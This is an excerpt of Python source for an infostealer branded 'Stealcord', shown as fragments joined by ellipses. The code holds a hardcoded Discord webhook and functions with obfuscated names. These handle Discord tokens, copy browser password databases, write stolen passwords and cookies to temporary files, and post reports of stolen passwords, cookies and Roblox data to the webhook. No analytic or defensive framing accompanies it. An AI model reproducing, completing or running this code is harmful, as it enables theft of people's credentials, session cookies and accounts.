...
hook = "https://discord.com/api/webhooks/1211326980432076841/KNWV059V-1kEejXthA4iSVWY9GBCE5vi7Nfi8FZ8bcT_eoyXEiOtThDwNpC_K90Gu-C2"
...
def G37UHQFr13ND5(token):
    badgeList =  [
        {"Name": 'Active_Developer', 'Value': 131072, 'Emoji': "<a:activedev:1095725933236858991> "},
        {"Name": 'Bug_Hunter_Level_2', 'Value': 16384, 'Emoji': "<a:bughunter2:1095726038031548456> "},
        {"Name": 'Early_Verified_Bot_Developer', 'Value': 4194304, 'Emoji': "<a:developer:1095726251001520252> "},
...
def UP104D70K3N(token, path):
    ...
    data = {
        ...
        "embeds": [
            ...
            "footer": {
                "text": "Stealcord | discord.gg/stealcord",
                "icon_url": "https://cdn.discordapp.com/attachments/1206721383820820553/1211316982498988032/stealcord.png?ex=65edc1d9&is=65db4cd9&hm=423bbcf14bed442dcf4845dfb0d70593270009504dfb4dd0ed4c7a77b7241972&"
                },
            "thumbnail": {
                "url": f"{pfp}"
                }
        ...
        "avatar_url": "https://cdn.discordapp.com/attachments/1206721383820820553/1211317590107103322/stealcord.jpg?ex=65edc26a&is=65db4d6a&hm=e38016f562dbc623b4ebadc11e6c5935600fda27433d12926e202c035137c48a&",
        "username": "Stealcord | t.me/stealcord",
        "attachments": []
        }
...
data = {
            ...
            "embeds": [
                {
                    "title": "Stealcord | Roblox Information",
...
def UP104D(name, link):
    ...
    if name == "slcook":
        ...
        data = {
            ...
            "embeds": [
                {
                    "title": "Stealcord | Cookies",
                    "description": f"**Found**:\n{rb}\n\n**Data:**\n <:blackmember:1095740314683179139>  • **{C00K1C0UNt}** Cookies Found \n <:blackarrow:1095740975197995041> • [Stealcord Cookies.txt]({link})",
                    "color": color,
                    "footer": {
                        "text": "Stealcord | discord.gg/stealcord",
                        "icon_url": "https://cdn.discordapp.com/attachments/1206721383820820553/1211316982498988032/stealcord.png?ex=65edc1d9&is=65db4cd9&hm=423bbcf14bed442dcf4845dfb0d70593270009504dfb4dd0ed4c7a77b7241972&"
    ...
    if name == "slpassw":
        ...
        data = {
            ...
            "embeds": [
                {
                    "title": "Stealcord | Passwords",
                    "description": f"**Found**:\n{ra}\n\n**Data:**\n <:blacklock:1095741022065131571> • **{P455WC0UNt}** Passwords Found\n <:blackarrow:1095740975197995041> • [Stealcord Passwords.txt]({link})",
                    "color": color,
                    "footer": {
                        "text": "Stealcord | discord.gg/stealcord",
                        "icon_url": "https://cdn.discordapp.com/attachments/1206721383820820553/1211316982498988032/stealcord.png?ex=65edc1d9&is=65db4cd9&hm=423bbcf14bed442dcf4845dfb0d70593270009504dfb4dd0ed4c7a77b7241972&"
...
def wr173F0rF113(data, name):
    path = os.getenv("TEMP") + f"\sl{name}.txt"
...
def g37P455W(path, arg):
    ...
    tempfold = temp + "sl" + ''.join(random.choice('bcdefghijklmnopqrstuvwxyz') for i in range(8)) + ".db"
...
def G47H3r411():
    ...
    for file in ["slpassw.txt", "slcook.txt"]: 
